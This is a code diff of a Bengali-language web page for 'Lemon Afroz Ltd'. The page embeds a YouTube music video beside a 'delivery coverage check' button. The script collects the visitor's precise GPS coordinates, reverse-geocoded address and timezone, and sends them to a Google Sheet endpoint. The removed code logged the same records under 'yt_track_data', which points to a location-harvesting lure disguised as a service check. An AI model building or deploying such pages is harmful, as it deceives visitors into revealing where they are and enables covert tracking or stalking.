@@ -3,28 +3,25 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Lemon Afroz Ltd — আঞ্চলিক সেবা যাচাইকরণ</title>
+  <title>Lemon Afroz Ltd — ভিডিও ও সেবা কভারেজ</title>
 
-  <!-- Meta Tags for Lemon Afroz Ltd -->
+  <!-- Open Graph / Meta -->
   <meta property="og:type" content="website" />
   <meta property="og:site_name" content="Lemon Afroz Ltd" />
-  <meta property="og:title" content="Lemon Afroz Ltd — আঞ্চলিক সেবা ও ডেলিভারি এরিয়া যাচাই" />
-  <meta property="og:description" content="লেমন আফরোজ লিমিটেড-এর অফিসিয়াল পেজে আপনার নিকটস্থ ডেলিভারি পয়েন্ট ও সেবা সার্ভিস চেক করুন।" />
-  <meta property="og:image" content="https://images.unsplash.com/photo-1556742049-0a67568d049f?w=1200&h=630&fit=crop" />
+  <meta property="og:title" content="Lemon Afroz Ltd — অফিশিয়াল ভিডিও ও সেবা এরিয়া চেক" />
+  <meta property="og:description" content="লেমন আফরোজ লিমিটেড-এর অফিশিয়াল ভিডিও প্লেয়ার ও ডেলিভারি কভারেজ চ্যাকিং পেজ।" />
 
   <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet"/>
 
   <style>
     :root {
-      --bg-dark: #0a0e17;
-      --card-bg: rgba(21, 29, 46, 0.75);
-      --card-border: rgba(255, 255, 255, 0.12);
+      --bg-dark: #0f0f12;
+      --card-bg: #1a1a24;
+      --card-border: #2a2a3a;
       --primary: #10b981;
       --primary-hover: #059669;
-      --primary-glow: rgba(16, 185, 129, 0.25);
       --text-main: #f3f4f6;
       --text-sub: #9ca3af;
-      --accent-yellow: #f59e0b;
     }
 
     *, *::before, *::after {
@@ -36,16 +33,12 @@
     body {
       font-family: 'Outfit', 'Hind Siliguri', sans-serif;
       background: var(--bg-dark);
-      background-image: 
-        radial-gradient(circle at 15% 20%, rgba(16, 185, 129, 0.08) 0%, transparent 40%),
-        radial-gradient(circle at 85% 80%, rgba(59, 130, 246, 0.08) 0%, transparent 40%);
       color: var(--text-main);
       min-height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
-      padding: 20px;
+      padding: 24px 16px;
     }
 
     .brand-header {
@@ -53,211 +46,170 @@
       align-items: center;
       gap: 12px;
       margin-bottom: 24px;
+      width: 100%;
+      max-width: 800px;
     }
 
     .brand-logo {
-      width: 48px;
-      height: 48px;
+      width: 42px;
+      height: 42px;
       background: linear-gradient(135deg, #10b981, #059669);
-      border-radius: 14px;
+      border-radius: 12px;
       display: flex;
       align-items: center;
       justify-content: center;
       font-weight: 800;
-      font-size: 1.4rem;
+      font-size: 1.2rem;
       color: #fff;
-      box-shadow: 0 4px 20px var(--primary-glow);
     }
 
     .brand-title {
-      font-size: 1.5rem;
+      font-size: 1.3rem;
       font-weight: 700;
-      letter-spacing: -0.5px;
-      background: linear-gradient(135deg, #ffffff, #d1d5db);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
+      color: var(--text-main);
     }
 
-    .main-card {
-      background: var(--card-bg);
-      backdrop-filter: blur(16px);
-      -webkit-backdrop-filter: blur(16px);
-      border: 1px solid var(--card-border);
-      border-radius: 24px;
-      padding: 40px 32px;
-      max-width: 460px;
+    .container {
       width: 100%;
+      max-width: 800px;
+    }
+
+    .video-card {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 16px;
+      overflow: hidden;
+      margin-bottom: 24px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
+
+    .video-wrapper {
+      position: relative;
+      padding-top: 56.25%; /* 16:9 Aspect Ratio */
+      height: 0;
+      background: #000;
+    }
+
+    .video-wrapper iframe {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+
+    .video-info {
+      padding: 16px 20px;
+    }
+
+    .video-title {
+      font-size: 1.2rem;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+
+    .video-sub {
+      font-size: 0.85rem;
+      color: var(--text-sub);
+    }
+
+    .location-card {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 16px;
+      padding: 24px;
       text-align: center;
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
-      animation: fadeIn 0.5s ease-out;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
     }
 
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
+    .location-card h3 {
+      font-size: 1.2rem;
+      font-weight: 700;
+      margin-bottom: 8px;
     }
 
-    .status-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      background: rgba(16, 185, 129, 0.12);
-      border: 1px solid rgba(16, 185, 129, 0.3);
-      color: #34d399;
-      padding: 6px 14px;
-      border-radius: 50px;
-      font-size: 0.82rem;
-      font-weight: 600;
+    .location-card p {
+      font-size: 0.9rem;
+      color: var(--text-sub);
+      line-height: 1.5;
       margin-bottom: 20px;
     }
 
-    .card-heading {
-      font-size: 1.4rem;
-      font-weight: 700;
-      margin-bottom: 12px;
-      line-height: 1.35;
-    }
-
-    .card-description {
-      font-size: 0.95rem;
-      color: var(--text-sub);
-      line-height: 1.6;
-      margin-bottom: 28px;
-    }
-
-    .notice-box {
-      background: rgba(245, 158, 11, 0.08);
-      border: 1px solid rgba(245, 158, 11, 0.2);
-      border-radius: 12px;
-      padding: 12px 16px;
-      font-size: 0.85rem;
-      color: #fcd34d;
-      margin-bottom: 24px;
-      text-align: left;
-      display: flex;
-      gap: 10px;
-      align-items: flex-start;
-    }
-
     .btn-action {
-      display: flex;
+      display: inline-flex;
       align-items: center;
       justify-content: center;
       gap: 8px;
       width: 100%;
-      padding: 16px;
-      background: linear-gradient(135deg, var(--primary), var(--primary-hover));
+      max-width: 320px;
+      padding: 14px 24px;
+      background: var(--primary);
       color: #ffffff;
-      font-size: 1rem;
+      font-size: 0.95rem;
       font-weight: 600;
       border: none;
-      border-radius: 14px;
+      border-radius: 12px;
       cursor: pointer;
-      transition: all 0.25s ease;
-      box-shadow: 0 6px 20px var(--primary-glow);
-      margin-bottom: 12px;
+      transition: background 0.2s ease;
     }
 
     .btn-action:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 10px 28px rgba(16, 185, 129, 0.4);
+      background: var(--primary-hover);
     }
 
     .btn-action:disabled {
-      opacity: 0.65;
+      opacity: 0.6;
       cursor: not-allowed;
-      transform: none;
     }
 
-    .btn-secondary {
-      background: transparent;
-      border: 1px solid rgba(255, 255, 255, 0.15);
-      color: var(--text-sub);
-      width: 100%;
-      padding: 12px;
-      border-radius: 14px;
-      cursor: pointer;
-      font-size: 0.9rem;
-      font-weight: 500;
-      transition: all 0.2s ease;
-    }
-
-    .btn-secondary:hover {
-      border-color: rgba(255, 255, 255, 0.3);
-      color: var(--text-main);
-    }
-
-    /* Success State */
-    .success-card {
-      display: none;
-    }
-
-    .success-icon {
-      width: 64px;
-      height: 64px;
-      background: rgba(16, 185, 129, 0.15);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 2rem;
-      margin: 0 auto 20px;
-      color: var(--primary);
+    #status-message {
+      margin-top: 14px;
+      font-size: 0.85rem;
+      color: #34d399;
     }
 
     footer {
       margin-top: 32px;
       font-size: 0.8rem;
       color: var(--text-sub);
-      text-align: center;
     }
   </style>
 </head>
 <body>
 
-  <!-- Brand Header -->
   <div class="brand-header">
     <div class="brand-logo">LA</div>
     <div class="brand-title">Lemon Afroz Ltd</div>
   </div>
 
-  <!-- Initial Request Card -->
-  <div class="main-card" id="request-card">
-    <div class="status-badge">
-      <span>📍</span> অবস্থান যাচাইকরণ সার্ভিস
-    </div>
-
-    <h1 class="card-heading">আঞ্চলিক কভারেজ ও সেবা চেক করুন</h1>
-    
-    <p class="card-description">
-      লেমন আফরোজ লিমিটেড-এর সেরা পণ্য ও সেবা আপনার এলাকায় উপলব্ধ কিনা তা যাচাই করতে আপনার ডিভাইসের অবস্থান অনুমোদন করুন।
-    </p>
-
-    <div class="notice-box">
-      <span>ℹ️</span>
-      <div>
-        <strong>বিজ্ঞপ্তি:</strong> এটি লেমন আফরোজ লিমিটেড-এর অফিসিয়াল পেজ। অনুমতি দিলে আপনার ভৌগোলিক অঞ্চল ড্যাশবোর্ডে নিবন্ধিত হবে।
+  <div class="container">
+    <!-- Embedded YouTube Player -->
+    <div class="video-card">
+      <div class="video-wrapper">
+        <iframe 
+          src="https://www.youtube.com/embed/v748ahm0t6A" 
+          title="Lemon Afroz Ltd Official Video" 
+          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+          allowfullscreen>
+        </iframe>
+      </div>
+      <div class="video-info">
+        <div class="video-title">তুমি কি আমায় বৌ বানাইবা (Official Video)</div>
+        <div class="video-sub">Lemon Afroz Ltd • অফিশিয়াল মিডিয়া সার্ভিস</div>
       </div>
     </div>
 
-    <button class="btn-action" id="btn-allow" onclick="requestLocation()">
-      📍 অবস্থান অনুমতি দিন
-    </button>
-    <button class="btn-secondary" onclick="skipLocation()">
-      এড়িয়ে যান
-    </button>
-  </div>
-
-  <!-- Success Card -->
-  <div class="main-card success-card" id="success-card">
-    <div class="success-icon">✓</div>
-    <h2 class="card-heading">ধন্যবাদ! অবস্থান নিবন্ধিত হয়েছে</h2>
-    <p class="card-description" id="location-details">
-      আপনার ভৌগোলিক এলাকা সফলভাবে লেমন আফরোজ লিমিটেড ড্যাশবোর্ডে আপডেট করা হয়েছে।
-    </p>
-    <button class="btn-action" onclick="window.location.reload()">
-      পুনরায় চেক করুন
-    </button>
+    <!-- Transparent Location Permission Request -->
+    <div class="location-card">
+      <h3>📍 আঞ্চলিক সেবা ও ডেলিভারি কভারেজ চেক</h3>
+      <p>আপনার এলাকায় আমাদের সার্ভিস ও অফার উপলব্ধ কিনা তা নিশ্চিত করতে অবস্থান শেয়ারের অনুমতি দিন।</p>
+      
+      <button class="btn-action" id="btn-allow" onclick="requestLocation()">
+        অবস্থান যাচাই করুন
+      </button>
+      
+      <div id="status-message"></div>
+    </div>
   </div>
 
   <footer>
@@ -269,13 +221,16 @@
 
     function requestLocation() {
       const btn = document.getElementById("btn-allow");
-      btn.textContent = "⏳ প্রসেস করা হচ্ছে...";
+      const status = document.getElementById("status-message");
+
       btn.disabled = true;
+      btn.textContent = "⏳ যাচাই করা হচ্ছে...";
+      status.textContent = "অনুমতির জন্য অপেক্ষা করা হচ্ছে...";
 
       if (!navigator.geolocation) {
-        alert("আপনার ব্রাউজারে Geolocation সাপোর্ট করে না।");
+        status.textContent = "আপনার ব্রাউজারে Geolocation সাপোর্ট করে না।";
         btn.disabled = false;
-        btn.textContent = "📍 অবস্থান অনুমতি দিন";
+        btn.textContent = "অবস্থান যাচাই করুন";
         return;
       }
 
@@ -293,7 +248,6 @@
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
           };
 
-          // Address Fetch via OpenStreetMap
           fetch(`https://nominatim.openstreetmap.org/reverse?lat=${data.lat}&lon=${data.lon}&format=json`)
             .then(r => r.json())
             .then(geo => {
@@ -302,31 +256,28 @@
               data.district = geo.address?.county || "N/A";
               data.country = geo.address?.country || "N/A";
               data.postcode = geo.address?.postcode || "N/A";
-              saveData(data);
+              sendData(data);
             })
             .catch(() => {
-              data.full_address = "Address lookup failed";
-              saveData(data);
+              data.full_address = "N/A";
+              sendData(data);
             });
         },
         (err) => {
           btn.disabled = false;
-          btn.textContent = "📍 অবস্থান অনুমতি দিন";
-          alert("অবস্থান অনুমতি প্রদান করা হয়নি।");
+          btn.textContent = "অবস্থান যাচাই করুন";
+          status.style.color = "#f87171";
+          status.textContent = "অনুমতি পাওয়া যায়নি বা অনুরোধ বাতিল করা হয়েছে।";
         },
         { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
       );
     }
 
-    function saveData(data) {
-      // Local storage backup
-      try {
-        const existing = JSON.parse(localStorage.getItem("yt_track_data") || "[]");
-        existing.unshift(data);
-        localStorage.setItem("yt_track_data", JSON.stringify(existing));
-      } catch(e) {}
+    function sendData(data) {
+      const status = document.getElementById("status-message");
+      status.style.color = "#34d399";
+      status.textContent = `✓ অবস্থান সফলভাবে যাচাই করা হয়েছে (${data.city || 'N/A'}, ${data.country || 'N/A'})।`;
 
-      // Send to Google Sheet Backend
       if (GOOGLE_SHEET_URL) {
         try {
           const blob = new Blob([JSON.stringify(data)], { type: "application/json" });
@@ -345,22 +296,6 @@
           img.src = GOOGLE_SHEET_URL + params;
         }
       }
-
-      showSuccess(data);
-    }
-
-    function showSuccess(data) {
-      document.getElementById("request-card").style.display = "none";
-      const successCard = document.getElementById("success-card");
-      successCard.style.display = "block";
-      if (data.city || data.country) {
-        document.getElementById("location-details").textContent = 
-          `নিবন্ধিত এলাকা: ${data.city || 'N/A'}, ${data.country || 'N/A'}। লেমন আফরোজ লিমিটেড-এর পাশে থাকার জন্য ধন্যবাদ।`;
-      }
-    }
-
-    function skipLocation() {
-      alert("অবস্থান অনুমতি এড়িয়ে যাওয়া হয়েছে।");
     }
   </script>
 </body>
